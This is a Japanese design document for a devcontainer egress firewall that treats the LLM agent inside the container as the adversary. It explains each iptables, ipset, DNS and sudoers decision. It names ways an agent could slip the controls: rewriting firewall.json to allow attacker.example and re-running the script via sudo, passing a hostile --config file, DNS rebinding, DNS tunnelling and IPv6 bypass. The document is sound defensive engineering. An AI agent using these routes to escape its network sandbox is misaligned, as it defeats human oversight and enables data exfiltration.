## 1. 脅威モデル

### 1.1 敵はコンテナ内のエージェント自身

通常のファイアウォールは「外から来る攻撃者」を想定しますが、**このスクリプトが想定する敵は、コンテナの中で動いている LLM エージェントです。**

* プロンプトインジェクションを受けたエージェント
* 暴走したエージェント
* エージェントが実行した悪意あるコード（依存パッケージ、GitHub から取得したファイル）

いずれも `node` ユーザーの権限で、コンテナ内のあらゆるファイルを読み、任意のコマンドを実行できます。**秘密やソースコードを読める前提で、それを「どこへ出せるか」だけを制限する**のがこのスクリプトの役割です。

この前提が、他の多くの設計判断を規定しています。

* コンテナ内に書き込み可能な設定を置くと、それは設定ではなくなる（§2.1）
* INPUT 側のフィルタに実効性はない（allowlist に GitHub がある時点で任意コンテンツが入る）
* エージェントは再適用をいつでも実行できるので、再適用で変えられるものは守れない

### 1.2 守るもの

1. **漏洩シンクの制限** — 秘密やコードを書き出せる先を allowlist に限定する
2. **DNS 経路の固定** — 53 番宛を割り当てられたリゾルバのみに固定し、それ以外の試行を遮断・記録する
3. **攻撃プラットフォーム化の防止** — default DROP により C2 通信・スキャンの踏み台化を防ぐ

### 1.3 守らないもの（と、その理由）

| 守らないもの | 理由 |
|---|---|
| 悪性コンテンツの流入防止 | allowlist に GitHub / npm がある時点で任意のコンテンツは入る。INPUT 側フィルタに実効性はない |
| 完全な exfil 防止 | 許可先への GET クエリ経由など低帯域の経路が残る（§3.2） |
| DNS トンネリングの遮断 | 許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能（§3.1） |
| L7 制御（メソッド別・パス別） | iptables に見えるのは TCP 接続だけ。**L7 proxy へ移行しても扱いません**（§2.22 の「MITM proxy を採らない」） |
| IPv6 の allowlist | 全て拒否で足りる（§2.12） |

### 1.4 なぜ L3/L4 なのか

本命は L7 proxy です。名前で判定する層に移せば、ワイルドカードとアドレスが動くドメインが同時に解けます（[`spec.md`](./spec.md) §10.1）。**メソッド別制御は L7 へ移っても扱いません。** TLS を終端しない構成を採るためです（§2.22）。

それでも L3/L4 から始めたのは、**proxy が常駐コンポーネントを増やす**からです。`iptables` と `ipset` だけで動き、devcontainer に閉じて完結する構成のほうが、導入と検証のコストが桁違いに低い。`firewall.json` のスキーマをドメインリスト中心に保っているのは、proxy 設定へ変換可能にしておくためです。

**移行先の配置は sidecar コンテナに決めました**（§2.22）。当初の想定はホスト側でしたが、それだと「devcontainer に閉じて完結する」というこの節の利点をそのまま失います。sidecar なら同じ強度を devcontainer の内側で得られます。

## 2. 設計判断

### 2.1 実効設定を root 所有の固定パスに置き、探索を行わない

**決定:** 適用時に読むのは `/etc/egress-guard/firewall.json` のみ。探索は一切しない。repo 内の `.devcontainer/firewall.json` は「ソース」であり、イメージ再ビルドで実効設定になる。

**なぜ:** エージェントは sudoers により**いつでも再適用を実行できます**。再適用が読むファイルをエージェントが書き換えられるなら、root を取らずに 2 手でポリシー全体が無効になります。

1. `firewall.json` に `{"mode": "audit"}` または `{"allowDomains": ["attacker.example"]}` と書く（構文的に正当なのでバリデーションは全て通る）
2. `sudo /usr/local/bin/init-project-firewall.sh` を実行する

権限昇格は起きていませんが、目的は達成されています。

**この分離が生むもの:**

| 操作 | 実行者 | 必要な手順 |
|---|---|---|
| 再解決（CDN の IP 変動への追随） | エージェントで可 | 再適用のみ |
| ポリシー変更 | 人間 | repo の編集 + イメージ再ビルド |

CDN 対策としての「エージェント自身による再適用」は維持されます。

**探索を残さなかった理由（2 つ）:**

1. **構成非依存** — ワークスペースのマウント先は環境で変わる（`/workspace`、標準の devcontainer は `/workspaces/<name>`、その他）。特定のレイアウトを前提にした実装にしない
2. **攻撃面** — 「見に行く場所」を増やすほど、エージェントがポリシーを置ける候補地が増える

**代替案:** sudo 経由のときだけ固定パスにし、`--check-config` には探索を残す案（レビューでの提案）。採らなかったのは理由 1・2 の後者が効くため。まだインストールされていないファイルの検証は `--config` で足ります。

**コスト:** §3.5 を参照。

### 2.2 ネットワークを閉じてから allowlist を構築する

**決定:** IPv6 を最終状態（全 DROP）にし、IPv4 を bootstrap テーブル（loopback・リゾルバ・確立済みセッションのみ。`sshdPort` を指定していればその 1 ポートも）にしてから、DNS だけを使って allowlist を組み立てる。

**なぜ:** 初版は「flush → 名前解決 → ルール適用」の順でした。この順序には 2 つの欠陥があります。

* **初回に全開放の窓ができる。** flush 直後は policy ACCEPT でチェーンが空
* **2 回目の実行が収束しない。** 1 回目が適用した OUTPUT DROP が、2 回目の名前解決を遮断する

閉じてから構築すれば、**リビルド中に外部ネットワークを必要とする工程が 1 つも無くなります**。途中で強制終了されても「開いたまま固定される」状態になりません。

GitHub meta API の取得だけは最終テーブル適用後です（そこに到達できるのが適用後のため）。失敗しても GitHub の主要ホストは DNS 解決で許可済みなので、best effort で構いません。

### 2.3 `iptables-restore` の単一トランザクションで適用する

**決定:** 各アドレスファミリのフィルタテーブルを、chain policy ごと `iptables-restore` の 1 入力で置き換える。

**なぜ:** `iptables -A` の逐次投入では、「policy は DROP になったがルールがまだ入っていない」「ルールは入ったが policy が ACCEPT のまま」という中間状態が観測されます。SIGKILL を受ければそこで固定されます。

単一トランザクションなら、**旧テーブルか新テーブルのどちらかしか観測されません**。

IPv4 と IPv6 は 1 つのトランザクションを共有できません。そのため IPv6 を先に最終状態へ確定させ、以降は触らない構成にしています。

### 2.4 nat テーブルを触らない

**決定:** filter テーブルのみ操作する。nat は読みも書きもしない。

**なぜ:** 初版は「Docker の DNS DNAT ルールを退避 → nat を flush → 復元」という手順でした。しかし**非特権ユーザーは nat に書き込めません**。エージェントが nat を汚染する経路が無い以上、退避・復元は守るものが無いまま複雑性と失敗点を増やすだけです。

`iptables-restore` は入力に含まれるテーブルしか置き換えないため、filter だけを渡せば nat は自動的に無傷です。

**検証:** ユーザー定義ネットワーク（nat に DNS DNAT が存在する構成）で、適用前後の `iptables-save -t nat` が完全一致することを実機確認済み。`DOCKER_OUTPUT` / `DOCKER_POSTROUTING` とも無傷でした。

### 2.5 allowlist は staging set に組み立てて `ipset swap` する

**決定:** ルールが参照する live set（`egress-allow-v4`）は名前だけ固定し、中身は staging set で組み立てて `ipset swap` でアトミックに差し替える。

**なぜ:**

* **部分的に構築された allowlist をルールが参照しない。** swap の時点で live なのは bootstrap テーブルで、そのテーブルは set を参照しない
* **冪等性の根拠になる。** staging を毎回作り直すため、前回の内容に依存しない。初版の「`destroy` → `create`」は、ルールが参照している set を destroy できず破綻する

### 2.6 DNS の DROP を汎用 ESTABLISHED ACCEPT より前に置く

**決定:** 53 番宛のルール群を `-m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT` より前に配置する。

**なぜ:** 後ろに置くと、**スクリプト適用前に確立されていた外部 DNS のフロー**（UDP の conntrack エントリ、TCP/53 接続）が ESTABLISHED として通り抜け、ポリシー変更をまたいでトンネリングを継続できます。

適用前に確立された接続一般については §3.3 で受容していますが、DNS だけは例外扱いにしています。DNS が抜けるとポリシー全体が無意味になるためです。

### 2.7 リゾルバを `resolv.conf` から検出する

**決定:** `127.0.0.11` を決め打ちせず、`/etc/resolv.conf` の `nameserver` 行から IPv4 アドレスを収集する。

**なぜ:** 埋め込みリゾルバ `127.0.0.11` が提供されるかどうかはネットワーク構成で変わります（§4.1）。**決め打ちでは起動しません（実機で最初に踏んだ問題です）。**

`resolv.conf` の所有と、収集したアドレスの検証は [`spec.md`](./spec.md) §4.3。

IPv4 のリゾルバが 1 つも無い場合は、固定を緩めるのではなく停止します。DNS を開放するとポリシー全体が無意味になるためです。

### 2.8 適用フェーズを設定読み込みより前に始める

**決定:** `iptables` が使えると確認した時点で適用フェーズに入り、**設定エラーを含む**それ以降のあらゆる失敗を panic テーブルへ倒す。

**なぜ:** 以前は「設定の誤りで、既に入っているルールを乱すべきではない」という理由で、検証失敗時はルール未適用のまま終了していました。**その理屈が成り立つのは再適用時だけです。**

初回起動時の「直前のポリシー」は既定の全 ACCEPT です。そこで何も適用せずに終了すると、コンテナは開いたまま残ります。このスクリプトが防ごうとしている状態そのものです。

**コスト:** 設定にタイプミスがあるとコンテナが閉じます。`--check-config` で再ビルド前に気付けるため許容します（§2.18）。

**より強い解法:** コンテナの entrypoint で起動時点から最小 DROP ポリシーを適用し、このスクリプトはそこから展開する方式。検査の失敗が「開いたまま」に繋がる経路が原理的に消えます。現状は適用フェーズを前倒しすることで近似しています。

### 2.9 DNS 応答にも禁止レンジ検査をかける

**決定:** 名前解決で得た IP を `allowCidrs` と同じ禁止レンジ（RFC1918 / CGNAT / link-local / loopback / multicast / 予約）に照らし、該当するものは allowlist に入れない。

**なぜ:** `allowCidrs` には検査があるのに DNS 応答には無い、という非対称が**そのまま迂回路**でした。許可済みドメインのゾーンが攻撃者制御下にある、あるいは汚染された場合、`169.254.169.254`（クラウドのメタデータサービス）や RFC1918 アドレスを返すだけで allowlist に載ります。

しかも**エージェントは再適用の実行時刻を選べる**ため、DNS rebinding のタイミングを狙えます。

`host.docker.internal` だけは私設アドレスを返すのが正常なので、この検査を通さず専用の検査（§2.15）を使います。

### 2.10 ワイルドカードドメインを拒否する

**決定:** `*` を含む `allowDomains` エントリはバリデーションで拒否する。拒否メッセージに回避策を含める。

**なぜ:** allowlist は ipset（L3 の IP 集合）で、起動時に名前解決した結果を入れる方式です。パケットを見る時点でドメイン名は存在しません。そして **DNS には「あるゾーンのサブドメインを列挙する」手段がない**ため、`*.example.com` を IP の集合へ展開することは原理的にできません。

**代替案（旧実装）:** 受理して apex（`example.com`）だけ解決し、警告を出す。

これを止めたのは、**セキュリティ設定において「受理するが実現しない」のが最悪の性質**だからです。設定を書いた人は「サブドメイン全体が許可された」と信じ、実際には `api.example.com` も `db.example.com` も遮断されます。警告ではこの誤認を防げません。

初版仕様が例示に `*.neon.tech` を使っていたのは、実装能力を超えた記述であり仕様側の誤りでした。

**再導入:** L7 proxy 移行時にスキーマ version 2 で。proxy であればパケットにドメイン名（SNI / Host ヘッダ）が乗るため、展開せずにマッチできます。

#### ワイルドカード専用の A レコードが返る場合（apex 解決より悪い）

**「受理するが実現しない」より悪い形が実在します。** VS Code 拡張の配信 CDN で実際に踏んだ例です（[`known-issues.md`](./known-issues.md) #7）。

**`*.gallerycdn.vsassets.io` は literal で引けます。** DNS のワイルドカードレコードそのものが応答するためです。

```
dig +noall +answer A '*.gallerycdn.vsassets.io'   → 184.85.102.26  184.85.102.48
```

**引けたうえで、実際に使われる `23.*` とは別の IP が返ります。** 受理する実装なら「解決成功」としてこの 2 つを allowlist に入れ、通信は落ちます。ログ上は成功しているため、原因に辿り着くのが難しくなります。

上で「ワイルドカードを受理して apex だけ解決」を**「受理するが実現しない」は最悪の性質**として却下しましたが（一覧は §5）、**これはそれより悪い形です。** apex 解決なら別の名前を引いていると分かります。ワイルドカード専用の A レコードが返る場合は、正しく解決できたようにしか見えません。

**CDN によって成否が分かれる点も質が悪いところです。** Cloudflare の R2（`*.r2.cloudflarestorage.com` → `172.64.190.1` / `172.64.66.1`）は anycast がフラットなため、同じ手が**たまたま成立します**。動く例が先にあると、動かない例に当たったとき実装ではなく環境を疑うことになります。

**この形は却下の理由をさらに強めます。** 誤認を警告で防げないというこの節の論拠は、そもそも警告が出ない場合にそのまま当てはまります。

### 2.11 遮断先を ipset に記録し、カーネルログに依存しない

**決定:** 遮断された宛先 IP を ipset `egress-audit-v4` に蓄積する。`LOG` ルールも入れるが、運用の前提にしない。

**なぜ:** 初版は「audit モードで数日回し、`dmesg` のログから必要ドメインを収集する」運用を想定していました。**これは二重に成立しません。**

* コンテナ内の `dmesg` は `CAP_SYSLOG` が無いため読めない
* `net.netfilter.nf_log_all_netns` が既定 `0` のため、**カーネルが非初期 netns からのログを抑制する**。つまりホストから読んでも出てこない

ipset なら、ホスト側の設定に依存せず、追加パッケージも不要で、コンテナ内で完結します。

**却下した案:**

* **`--cap-add=SYSLOG`** — コンテナ内から `dmesg` が読めるようになりますが、カーネルリングバッファは名前空間化されていないため、**ホストと他コンテナのカーネルログが全てエージェントから読めるようになります**。egress を絞る目的と正面から衝突します
* **`nf_log_all_netns=1`** — VM / ホストの再起動で 0 に戻り、全コンテナのログがホストの dmesg に混ざり、読み出しがコンテナ外の作業になります
* **`NFLOG` への移行** — `nfnetlink_log` は netns 対応なのでコンテナ内から `tcpdump -i nflog:1` で読めます。時刻・ポートまで必要になったら検討しますが、現状は ipset で足りています

**DNS の DROP には専用の記録ルールを置きます。** DNS の DROP は allowlist より前段にあるため、これが無いと**外部ネームサーバーへの試行（＝トンネリング試行）がどこにも残りません**。最も見たいシグナルが最も見えない状態になります。

bootstrap テーブルには記録ルールを入れません。`SET` ターゲットは任意のカーネルモジュールに依存し、最終テーブルにはフォールバックがある一方で bootstrap の失敗は致命的だからです。

#### 記録は両モードで行うが、収集は `audit` で行う

**決定:** `enforce` でも遮断先を記録する。ただし allowlist を作るための収集フェーズには `audit` を使う。

**なぜ:** 記録が両モードで走るなら `enforce` のまま収集できそうに見えますが、**`enforce` で得られる記録は依存の連鎖の最初の 1 段だけです。** ドメイン A の応答をもとに B へ接続する処理では、A が遮断された時点で B への接続は試行されず、記録にも現れません。**必要な宛先を 1 回の観測で洗い出せるのは `audit` だけです。**

加えて、**`enforce` で支障が出ないことは、その宛先が不要だったことの証明になりません。** 失敗しても呼び出し側が黙って続行する通信（テレメトリ、ログ送信）や、遮断された結果として静かに挙動が変わるもの（feature flag）があります。「遮断して様子を見る」方式はこの種の依存を取りこぼします。

`enforce` 側の記録は、収集のためではなく**運用中に何が弾かれているかを後から確認するため**のものです。

### 2.12 IPv6 は allowlist を作らず全 DROP

**決定:** 外向き IPv6 は loopback を除いて全 DROP。audit モードでも DROP のまま。

**なぜ:**

1. **IPv4 だけ締めると allowlist が無意味になる。** 宛先アドレス選択（RFC 6724）は AAAA を優先するため、IPv6 経路が開いていれば allowlist を素通りできる
2. **allowlist を IPv6 にも作るのは割に合わない。** ipset の二重化、AAAA 解決、GitHub meta の v6 レンジ処理、自己検証の二重化が必要になる一方、セキュリティ上の利得はない
3. **閉じても壊れない。** Docker は既定で IPv6 を有効化しないため、コンテナに global IPv6 アドレスは付かない
4. **開けるリスクと閉じるコストが非対称**

#### silent DROP ではなく REJECT する

**決定:** IPv6 の OUTPUT 末尾に `-j REJECT --reject-with icmp6-adm-prohibited` を置く。chain policy は DROP のまま。

**なぜ:** DROP は ICMP を返しません。一方、許可したホスト名が AAAA も持つと、クライアントは宛先アドレス選択（RFC 6724）に従って**先に IPv6 を試します**。

```
名前解決 → AAAA を得る → IPv6 で接続 → DROP（無応答）→ タイムアウト待ち
          → A にフォールバック → IPv4 で接続成功
```

**接続はするが毎回遅い**という失敗の仕方で、しかも待ち時間は**クライアントが Happy Eyeballs を実装しているかどうか**に依存します。正しく許可したホストへの到達性を、クライアントライブラリの実装に預けることになります。

REJECT なら即座に IPv4 へフォールバックします。コストはありません — OUTPUT チェーンの REJECT が生成する ICMPv6 はローカルで生成されローカルのソケットへ配送されるため、**何も回線に出ません**。IPv4 の未許可先が `icmp-admin-prohibited` で即断しているのに IPv6 だけ silent DROP という非対称も解消します。

**代替案:** IPv6 が有効なコンテナで実測してから判断する（当初の方針）。**「AAAA を持つ許可先への接続が、IPv6 の silent DROP でタイムアウト待ちになるのではないか」は、当初 [`known-issues.md`](./known-issues.md) に未検証事項として挙げていたものです。**

採らなかったのは、**実測を待つより設計で問いを消すほうが確実**だからです。上の REJECT により IPv4 へのフォールバックは即座に起こり、クライアントが Happy Eyeballs を実装しているかどうかに依存しなくなりました（[`spec.md`](./spec.md) §4.7）。

**実測しても解決にはなりませんでした。** 得られるのは 1 つの環境・1 つのクライアントについての結果であり、環境依存の不確実性は残ったままです。

**panic テーブルは対象外です。** IPv4 / IPv6 とも silent DROP のままにしています。通常運転では即座の失敗に価値がありますが、panic は成立させる前提を最小にすべき状態です。

### 2.13 `ip6tables` が使えず IPv6 スタックが生きているなら失敗する

**決定:** `ip6tables` が使えない場合、`/proc/net/if_inet6` が非空なら exit≠0。空ならスキップ。

**なぜ:** 「`ip6tables` が無い = IPv6 が無い」という推論は成り立ちません。バイナリ未導入、nft backend の不整合でも、**スタックは生きていて経路も張られます**。そこでスキップすると IPv6 が素通りし、§2.12 の 1 番目の理由がそのまま実現します。

### 2.14 自己検証のプローブを動的に選び、「いずれか一致」で判定する

**決定（プローブ）:** 外部 DNS のプローブは「設定済みリゾルバでないアドレス」、未許可先のプローブは「解決した IP が全て allowlist 外のホスト」を、候補リストから選ぶ。

**なぜ:** ハードコードすると、プロジェクトがそれを許可した瞬間に「**正しい設定なのに自己検証が壊れる**」状態になります。`example.com` を `allowDomains` に入れただけでコンテナが起動しなくなる、というのは実機で踏みました。

**決定（判定）:** `firewall.json` のドメイン検証は「再解決した IP の**いずれか**が allowlist にあれば成功」。

**なぜ:** 大規模 CDN は DNS ラウンドロビンで問い合わせのたびに異なる部分集合を返します。「最初の 1 IP」で判定すると、構築時と検証時で返る A レコード集合がずれた瞬間に、正しいポリシーがランダムに検証失敗します。自己検証の失敗は panic + exit≠0、すなわち**コンテナの起動失敗**です。fail-closed 側に倒れるとはいえ、正しい設定で起動が不安定になるのは運用上の欠陥です。

### 2.15 `host.docker.internal` も許可対象にし、私設アドレスであることを確認する

**決定:** `allowHostPorts` はデフォルトゲートウェイに加え `host.docker.internal` の解決結果も許可する。解決結果が RFC1918 / CGNAT / link-local であることを確認し、そうでなければ使わない。

**なぜ（両方許可）:** **Docker Desktop ではこの 2 つが別アドレスになります。** 実機では `172.17.0.1`（ゲートウェイ）と `192.168.65.254` で、しかもホストへの到達は後者経由でしか成立しませんでした（前者の ACCEPT ルールはパケットカウンタが 0）。ゲートウェイのみを許可する実装では、ホスト上のローカル DB に届きません。

**なぜ（アドレス検査）:** 公開アドレスが返るのは、名前が横取りされた場合です。そこにポートを開けば「ホスト宛の許可」ではなく**任意のインターネットホストへの穴**になります。

なお `host.docker.internal` は `/etc/hosts` ではなく **DNS で解決されています**（`resolve_domain` は `dig` を先に試し、Docker のリゾルバがこの名前に応答する）。デフォルトブリッジでもユーザー定義ネットワークでも同じでした。

### 2.16 sudoers は末尾 `""`、immutable は使わない

**決定（sudoers）:** `node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""` と書く。

**なぜ:** sudoers の仕様では、**Cmnd に引数を書かないと「任意の引数で実行してよい」という意味になります。** 引数なしのみを許可するには空の引数リスト `""` の明示が必要です。これを落とすとエージェントが `--config /tmp/evil.json` を渡せます。

スクリプト側にも多重防御があり、`SUDO_USER` / `SUDO_UID` が設定された状態で引数が渡されたら拒否します。sudoers を正しく書いていればここには到達しません。

**決定（immutable）:** `chattr +i` は使わない。

**なぜ:** `CAP_LINUX_IMMUTABLE` が Docker のデフォルト capability セットに含まれず、**`docker build` の `RUN` であっても失敗します**（実測）。加えて `chattr +i` が守るのは「root を取った攻撃者による書き換え」ですが、root を取られた時点で `chattr -i` も打てるため防御価値は限定的です。達成できず防御価値も限られるもののために複雑性を足しません。

代わりに成立している防御 2 点（所有権とパーミッション、sudoers の引数制限）は [`spec.md`](./spec.md) §2.1。

### 2.17 基底プロファイルをスクリプトに埋め込む

**決定:** 全プロジェクト共通の allowlist を、同梱 JSON ではなくスクリプト本体に書く。

**なぜ:** 同梱 JSON は `node_modules` 内に置かれます。**非特権ユーザーが書き換えられる場所にポリシーの基底を置くのは、§2.1 と同じ誤り**です。

#### 選べるようにする（バンドル方式）

**決定:** 埋め込んだドメインを 4 つのバンドル（`anthropic` / `npm` / `vscode` / `github`）に分け、`firewall.json` の `profile` で選択させる。**既定（`profile` 省略時）は「何も選ばない」とする**（[`spec.md`](./spec.md) §3.3）。

**なぜ:** 当初は 13 ドメインを無条件に許可していましたが、**全プロジェクトに全部が要るわけではありません。** Codex しか使わないプロジェクトに `api.anthropic.com` は不要です。allowlist に載っている宛先は、そのまま漏洩先として使える宛先です。**使わないものを載せておく理由はありません。**

**`allowDomains` に直接列挙させる案は採りませんでした。** 各プロジェクトが同じホスト名を複製することになり、エンドポイントが変わったときに全プロジェクトがドリフトします。バンドルにすれば、束の中身の保守はパッケージ側に残ります。**方針は雛形（`templates/*.json`）が持ち、コードは持ちません。**

**「repo 側の PR でバンドルを削れてしまう」ことは受容します。** 削る方向の変更は fail-closed で、遮断が増えるだけです。増やす方向は `allowDomains` で以前から可能でした。

#### 既定を「全バンドル」にしない

**決定:** `profile` 省略時は基底プロファイルなし。`"default"` という名前は廃止する。

**なぜ:**

* **元の 13 ドメインは [claude-code の devcontainer](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh) 由来で、特定製品の都合です。** 汎用パッケージの既定として説明できません
* **ファイアウォールの既定は deny です。** 他の判断はすべて fail-closed で揃えてあります（設定エラー→panic、リゾルバ無し→停止、未知キー→拒否）。「書かなければ 13 個開く」だけが逆向きでした
* **npm 未公開の段階なので、移行コストがありません。** 変えるならこの時点しかありません

**代償:** `profile` を書かずに立ち上げると Claude Code が動きません。ただし fail-closed なので即座に分かり、`"default"` を書いた場合は列挙を促す専用のエラーが出ます。雛形からコピーする既定の手順を踏めば起きません。

#### 元の 13 ドメインのうち 3 つをバンドルに入れない

**決定:** `sentry.io`、`statsig.com`、`console.anthropic.com` を、どのバンドルにも含めない。

**なぜ（当初）:** 前の 2 つは Claude Code のテレメトリと feature flag です。**動作に必須かどうかを実測していませんでした。** 必須でないものをパッケージの束に入れると、それを選んだ全プロジェクトで漏洩先が増えます。必要な利用者は `allowDomains` に書けます。**実測して必要だと分かった時点で `anthropic` バンドルに入れる**、という順序にしました。

`anthropic` バンドルは「Claude Code を動かす最小構成」という位置づけです。

**その後の実測で確定しました**（[`measuring-egress.md`](./measuring-egress.md)）。

* `audit` の観測では、この 2 つへの接触は**一度もありませんでした**
* `claude` の実行ファイル（v2.1.221）の走査では、**文字列として存在しませんでした。** 「観測されなかった」ではなく「そのバージョンは使っていない」と言えます
* 同じ走査で **`console.anthropic.com` も 0 ヒット**でした（`api.anthropic.com` は 79）。これも元の 13 ドメインから引き継いだだけだったため、同時に外しました。**結果として `anthropic` バンドルは 1 ドメインです**

**代償はほぼ消えました。** 当初は「未実測のまま外したので挙動が静かに変わるかもしれない」という受容でしたが、実行ファイルに存在しない以上、そのバージョンでは何も起きません。**将来のバージョンで復活する可能性は残ります**（測り直しの契機は [`measuring-egress.md`](./measuring-egress.md)）。

**代わりに、元の 13 ドメインに入っていなかった宛先が 2 つ観測されました。** Datadog のログ収集エンドポイントと `downloads.claude.ai` です。**リストをそのまま写していたら、必要なものが塞がり、不要なものが開いたままになっていました。** 選択制にして測るという方針そのものの裏付けです。

Datadog は入れませんでした。**送信元は実行ファイルの走査で Claude Code 本体と確定しましたが、判断は変えていません。** テレメトリであることは送信元が分かっても変わらず、遮断したまま Claude Code も codex も動いています。

#### バンドルは実測してから作る

**決定:** 新しいバンドルは、対象の道具を `audit` のコンテナで動かして観測してから作る。ベンダーが公開しているリストや、他所の設定ファイルを写さない。

**なぜ:** 初版の 13 ドメインを写した結果が上記のとおりだったからです。`openai` バンドルはこの手順で作りました（[`measuring-egress.md`](./measuring-egress.md)）。**推測で書かれていた 3 ドメインのうち、実際に使われたのは 2 つでした。**

**観測できなかったものは入れません。** `api.openai.com`（API キー経路）は測っていないため含めていません。**「たぶん要る」で足したものは、要らなかったと分かる機会が来ません。**

#### 更新チャネルを別のバンドルにする

**決定:** `downloads.claude.ai` / `downloads.claude.com` を `anthropic` に含めず、`anthropic-updates` として分ける。

**なぜ:** どちらの選択にも理由があり、パッケージ側で決められないからです。

* **固定したい側** — 再現性。このパッケージの設計原則（すべての変更はイメージ再ビルドを経由する。§2.1、I1）とも揃います。**この `docs/` 自体、「Claude Code v2.1.221 で実測」のようにバージョンを添えた記録を持っています。** 測っている最中に自動更新が走れば、その記録が何のバージョンのものか分からなくなります
* **最新を使いたい側** — 修正が届かないのは実害です

**遮断しても道具は動き続け、更新だけが失敗します。しかも無音ではなく、コンソールにエラーが出ます。** 「気づかないまま古いバージョンで使い続ける」という最悪の形にはならないため、既定で開ける必要はありません。**方針は雛形が持ちます**（`templates/*.json` には含めてあります）。

`anthropic` バンドルは「Claude Code を動かす最小構成」という定義を保ちます。更新は動作に必須ではありません。

#### 「常に許可されているドメイン」が消えたこと

**代償:** ネットワーク生存判定と自己検証はそれに依存していたため、実行時に決まるアンカードメイン（[`spec.md`](./spec.md) §3.3）へ置き換えました。**利用者から見た代償は切り分け手順のほうが大きく**、「`api.anthropic.com` に到達できるか試す」が使えなくなります。代わりに `--print-allowlist`（[`spec.md`](./spec.md) §8.1）を入口にします。

### 2.18 `--check-config` を残す

**決定:** 設定を検証して終了する開発用オプションを残す。sudo 経由では拒否する。

**なぜ:**

* **バリデータの end-to-end テストがこの経路にしかない。** `validate_domain` 等は source して直接呼べますが、未知フィールドの拒否・version 不一致・拒否メッセージの内容は `read_config` を通さないと検証できません
* **設定の反映に再ビルドが要るため、事前検証の価値が高い**（§2.1）。タイプミスの代償が「再ビルド → 起動失敗 → 修正 → 再ビルド」になります。`jq . firewall.json` では JSON 構文しか見ず、スキーマ・CIDR・ドメインの検証は通りません

### 2.19 配置をスクリプト自身が検証する

**決定:** スクリプト自身・`/etc/egress-guard/firewall.json`・その親ディレクトリについて、root 所有・非書き込み・非 symlink を起動時に検査する。

**なぜ:** 配置は利用者が書く Dockerfile の産物であり、間違えても**静かに弱い構成で動いてしまいます**。特に sudoers が `node_modules` 内を指していても、動作としては正常に見えます。

以前は README に手動確認手順（`ls -l` 4 行）を置いていましたが、**毎回のリビルド後に人が実行することを前提にした防御は機能しません**。スクリプトが検査すれば利用者の作業はゼロになります。

**限界:** §3.4 を参照。

### 2.20 DNS 連動 allowlist（dnsmasq + `ipset=`）を採らない

**決定:** コンテナ内に dnsmasq を置き、許可ドメインの解決結果を解決時に ipset へ注入する案は**採らない**。同じ課題は L7 proxy への移行（[`spec.md`](./spec.md) §10.1）で解決する。

外部レビューからの提案で、[`spec.md`](./spec.md) §9.1（ワイルドカード不可）・§9.4（DNS トンネリング）・§9.7（アドレスが動くドメイン）を同時に緩める案として枠だけ置いてありました。2026-08-03 に dnsmasq 2.93 のソースを読んで判断しました。

**得られるものは本物です。** 解決時注入なら `*.gallerycdn.vsassets.io` も `deb.debian.org` も通り、非許可名を潰せば DNS トンネリングが実際に塞がります。それでも採らない理由は次の 2 つです。

#### なぜ 1: 常駐する `CAP_NET_ADMIN` プロセスに、敵が選んだ入力を食わせ続けることになる

**`ipset` を使う dnsmasq は `CAP_NET_ADMIN` を保持し続けます。** 非特権 uid に落ちたあとも effective に残します（`src/dnsmasq.c`）。

```c
if (need_cap_net_admin && !(data->permitted & (1 << CAP_NET_ADMIN)))
...
data->effective |= (1 << CAP_NET_ADMIN);
```

コンテナ内の `CAP_NET_ADMIN` は iptables と ipset を自由に書ける権限です。**つまり、常駐する C のパーサが上流 DNS 応答を処理し続け、かつファイアウォールを書き換える権限を持ちます。**

§1 の脅威モデルにおける敵はコンテナ内のエージェントであり、**エージェントは「どの名前を引くか」を自由に選べます。** 任意のドメインの応答をそのパーサに届けられる、ということです。dnsmasq が落ちれば I1 と I2 が同時に崩壊します。

**現行設計には常駐する特権プロセスが 1 つもありません。** 特権で動くのは起動時のスクリプトだけで、実行は短時間です。この案はそこを構造ごと変えます。

（2026 年に複数の脆弱性が報告されたとする二次情報がありますが、**裏を取れていません。** 参照したミラーの最終コミットが 2026-03-15 で、CHANGELOG の CVE 記述は CVE-2022-0934 が最新でした。上の理由は CVE の有無に依存しません。）

#### なぜ 2: 期待していた「TTL 連動」が実装として存在しない

`src/ipset.c` が送る netlink 属性は `IPSET_ATTR_PROTOCOL` / `IPSET_ATTR_SETNAME` / `IPSET_ATTR_DATA→IP` だけです。

* **`IPSET_ATTR_TIMEOUT` を送りません。** エントリの寿命は DNS の TTL ではなく set の既定 timeout になります
* **`IPSET_FLAG_EXIST` を送りません。** 既存要素への追加はカーネルがエラーを返すだけで、**再解決してもタイマーは延びません**
* **`NLM_F_ACK` を立てず、応答を読みません。** set が満杯・不在でも dnsmasq は気づきません
* 追加は `rfc1035.c` の `extract_addresses()`、つまり**上流応答を解析したときだけ**です。キャッシュヒットでは追加されません

帰結として、どちらを選んでも問題が残ります。

* **set に timeout を付ける** — エントリが期限切れした後も dnsmasq はキャッシュを返すため、**周期的に通信が落ちる窓**ができます。断続的な障害は最も追いにくい壊れ方です
* **timeout を付けない** — エントリが単調増加します。maxelem に当たるほか、**CDN のプールから離脱した IP が別テナントに再割当されても許可され続けます**

**「CDN drift が構造ごと消える」という当初の見立ては誤りでした。** 正確には「drift を蓄積で覆い隠す」です。[`spec.md`](./spec.md) §9.7 の解消としては弱く、同 §9.1 の解消は本物ですが、それだけでは なぜ 1 の対価に見合いません。

#### 検討した中間案

**dnsmasq には `log-queries` だけさせ、set への追加は別プロセスが行う**構成なら、パーサから `CAP_NET_ADMIN` を剥がせます。なぜ 1 は消え、なぜ 2 は残ります。**L7 proxy を採るなら不要になるため、採用しませんでした。** L7 proxy はパーサをコンテナの外に出せるうえ、[`spec.md`](./spec.md) §9.1 と §9.2 も同時に解決します。

### 2.21 Dev Container Feature 化を採らない（保留）

**決定:** パッケージの導入を [Dev Container Feature](https://containers.dev/implementors/features/) にまとめる案は**現時点では採らない**。却下ではなく保留で、着手する条件は [`known-issues.md`](./known-issues.md) #6。

**なぜ:** 得られるのは導入側 `Dockerfile` 約 25 行の削減だけで、**セキュリティ機構の実体がリポジトリの外へ出ます。** `firewall.json` を root 所有の固定パスへ渡す経路も、テストの無いシェルスクリプトに移るか、書き忘れが静かに通る形になります。

